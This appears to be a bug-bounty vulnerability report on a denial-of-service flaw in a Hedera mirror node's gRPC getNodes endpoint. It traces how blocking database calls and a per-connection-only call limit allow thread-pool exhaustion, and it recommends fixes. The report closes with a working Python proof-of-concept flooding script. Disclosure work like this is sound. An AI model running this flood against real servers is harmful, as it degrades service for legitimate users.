### Title
Unauthenticated `getNodes()` Flooding Saturates gRPC Application Thread Pool via Unbounded Concurrent Connections

### Summary
`NetworkController.getNodes()` accepts unauthenticated gRPC calls with no global rate limit or connection cap. Each call executes blocking database queries on the shared `applicationTaskExecutor` thread pool (configured via `serverBuilder.executor(applicationTaskExecutor)`). An attacker opening many connections — each with up to 5 concurrent calls — can exhaust this bounded thread pool, causing all legitimate gRPC requests to queue and latency to spike for all users.

### Finding Description
**Code path:**

`NetworkController.getNodes()` (line 34) constructs `Mono.fromCallable(() -> toFilter(request))` with no `subscribeOn()`. In Project Reactor, a `fromCallable` without an explicit scheduler runs synchronously on the subscribing thread. The subscribing thread here is whichever thread the gRPC server dispatches the call to — the `applicationTaskExecutor`, as wired in `GrpcConfiguration` line 32:

```java
serverBuilder.executor(applicationTaskExecutor);
```

The `flatMapMany(networkService::getNodes)` call (line 35) then invokes `NetworkServiceImpl.getNodes()` (lines 61–65), which performs three **synchronous, blocking** database calls on that same thread before returning a `Flux`:

```java
long addressBookTimestamp = addressBookRepository.findLatestTimestamp(fileId.getId())...
long nodeStakeTimestamp = nodeStakeRepository.findLatestTimestamp()...
var nodeStakeMap = nodeStakeRepository.findAllStakeByConsensusTimestamp(nodeStakeTimestamp);
```

The first page of results is also fetched synchronously via `transactionOperations.execute()` in `page()` (line 80), again on the same `applicationTaskExecutor` thread. Only subsequent pages (via `repeatWhen` with `Schedulers.boundedElastic()`, line 72) move off that thread.

**Root cause / failed assumption:** The design assumes that the `maxConcurrentCallsPerConnection = 5` guard (line 14 of `NettyProperties`) is sufficient to bound total server load. This assumption fails because the limit is **per-connection**, not global. There is no limit on the number of inbound connections, no per-IP rate limit, and no global concurrent-call cap anywhere in the gRPC module. The web3 module's bucket4j throttle (`ThrottleConfiguration`) is entirely separate and does not apply here.

**Exploit flow:**
1. Attacker opens N gRPC connections to port 5600 (no authentication, no connection limit).
2. On each connection, attacker issues 5 concurrent `getNodes` calls (the per-connection maximum).
3. Each call blocks one `applicationTaskExecutor` thread for the duration of the synchronous DB queries.
4. With enough connections, all threads in the bounded `applicationTaskExecutor` pool are occupied.
5. New legitimate gRPC calls (including `subscribeTopic` and other `getNodes` calls) queue behind attacker requests.
6. Response latency for all users increases proportionally to queue depth.

### Impact Explanation
The `applicationTaskExecutor` is the single shared executor for all gRPC service methods on this server instance. Saturating it degrades every gRPC endpoint, not just `getNodes`. Legitimate clients (e.g., wallets, SDKs, monitors) experience increased latency or timeouts. No economic damage occurs to the network itself, but service availability of the mirror node gRPC API is degraded — consistent with the griefing classification in scope.

### Likelihood Explanation
The attack requires only a standard gRPC client library and a network path to port 5600. No credentials, tokens, or special protocol knowledge are needed. The attacker does not need to sustain a high packet rate — holding N long-lived streaming connections with 5 concurrent calls each is sufficient and cheap. The `pageDelay` default of 250ms and `pageSize` of 10 mean each `getNodes` call holds a thread for multiple round-trips, amplifying the blocking effect per connection. This is trivially repeatable from a single host or a small botnet.

### Recommendation
1. **Add a global concurrent-call limit** via `NettyServerBuilder.maxConcurrentCallsPerConnection` combined with a global connection limit (`maxConnectionAge`, `maxConnectionIdle`, or a custom `ServerInterceptor` tracking total active calls).
2. **Add a per-IP or global rate limiter** for `getNodes` using a `ServerInterceptor` with a token-bucket (analogous to the existing bucket4j setup in the web3 module).
3. **Move blocking DB work off the gRPC executor** by adding `.subscribeOn(Schedulers.boundedElastic())` to the reactive chain in `getNodes()`, so the `applicationTaskExecutor` threads are not held during DB I/O.
4. **Cap inbound connections** at the load-balancer or Netty level (`NettyServerBuilder.maxConnectionAge` / `maxConnectionIdle`).

### Proof of Concept
```python
import grpc
import threading
from hedera.mirror.api.proto import network_service_pb2_grpc
from hedera.mirror.api.proto.address_book_query_pb2 import AddressBookQuery
from hederahashgraph.api.proto.java.basic_types_pb2 import FileID

TARGET = "mirror-node-grpc-host:5600"
NUM_CONNECTIONS = 50   # each gets 5 concurrent calls = 250 total threads
CALLS_PER_CONN = 5

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = network_service_pb2_grpc.NetworkServiceStub(channel)
    query = AddressBookQuery(file_id=FileID(file_num=102), limit=0)
    threads = []
    for _ in range(CALLS_PER_CONN):
        t = threading.Thread(target=lambda: list(stub.getNodes(query)))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

workers = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for w in workers: w.start()
for w in workers: w.join()
# Measure latency of a legitimate getNodes call during the flood vs. baseline
```

Running this saturates the `applicationTaskExecutor` pool. A concurrent legitimate `getNodes` call issued during the flood will show measurably higher latency or a timeout compared to baseline.
